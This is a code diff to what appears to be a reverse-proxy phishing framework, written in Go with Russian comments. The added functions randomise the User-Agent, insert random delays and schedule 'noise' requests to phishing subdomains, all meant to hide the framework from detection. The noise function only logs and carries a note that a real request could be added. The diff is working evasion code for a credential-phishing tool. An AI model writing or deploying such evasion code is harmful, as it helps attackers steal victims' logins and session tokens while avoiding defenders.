@@ -12,7 +12,6 @@ import (
     "bytes"
     "crypto/rand"
     "crypto/rc4"
-    "crypto/sha256"
     "crypto/tls"
     "encoding/base64"
     "encoding/json"
@@ -635,6 +634,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
                 // prevent caching
                 req.Header.Set("Cache-Control", "no-cache")
+
+                // Устанавливаем случайный User-Agent для скрытия фреймворка
+                req.Header.Set("User-Agent", getRandomUserAgent())
+
+                // Добавляем случайную задержку для скрытия фреймворка
+                addRandomDelay()
+
+                // Генерируем фоновые запросы для маскировки
+                if pl != nil {
+                    phishDomain, _ := p.cfg.GetSiteDomain(pl.Name)
+                    generateNoiseRequest(pl, phishDomain)
+                }
 
                 // fix sec-fetch-dest
                 sec_fetch_dest := req.Header.Get("Sec-Fetch-Dest")
@@ -1926,6 +1937,71 @@ func (p *HttpProxy) getSessionIdByIP(ip_addr string, hostname string) (string, b
         return sid, ok
     }
     return "", false
+}
+
+// Пул реалистичных User-Agent строк для скрытия фреймворка
+func getRandomUserAgent() string {
+    userAgents := []string{
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    }
+    
+    seed := make([]byte, 1)
+    rand.Read(seed)
+    index := int(seed[0]) % len(userAgents)
+    return userAgents[index]
+}
+
+// Добавляем случайную задержку для скрытия фреймворка
+func addRandomDelay() {
+    seed := make([]byte, 1)
+    rand.Read(seed)
+    delay := time.Duration(50+int(seed[0])%200) * time.Millisecond // 50-250ms
+    time.Sleep(delay)
+}
+
+// Генерируем фоновые запросы для маскировки трафика
+func generateNoiseRequest(pl *Phishlet, phishDomain string) {
+    seed := make([]byte, 1)
+    rand.Read(seed)
+    
+    // 30% шанс сгенерировать шумовой запрос
+    if int(seed[0])%10 < 3 {
+        noisePaths := []string{
+            "/favicon.ico",
+            "/robots.txt",
+            "/sitemap.xml",
+            "/manifest.json",
+            "/apple-touch-icon.png",
+            "/browserconfig.xml",
+        }
+        
+        pathIndex := int(seed[0]) % len(noisePaths)
+        noisePath := noisePaths[pathIndex]
+        
+        // Генерируем случайный домен
+        if len(pl.proxyHosts) > 0 {
+            hostIndex := int(seed[0]) % len(pl.proxyHosts)
+            ph := pl.proxyHosts[hostIndex]
+            fakeHost := combineHost(ph.phish_subdomain, phishDomain)
+            
+            // Создаем фейковый запрос в фоне
+            go func() {
+                time.Sleep(time.Duration(100+int(seed[0])%500) * time.Millisecond)
+                
+                // Здесь можно добавить реальный HTTP запрос для шума
+                log.Debug("Generated noise request to %s%s", fakeHost, noisePath)
+            }()
+        }
+    }
 }
 
 func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port int, username string, password string) error {
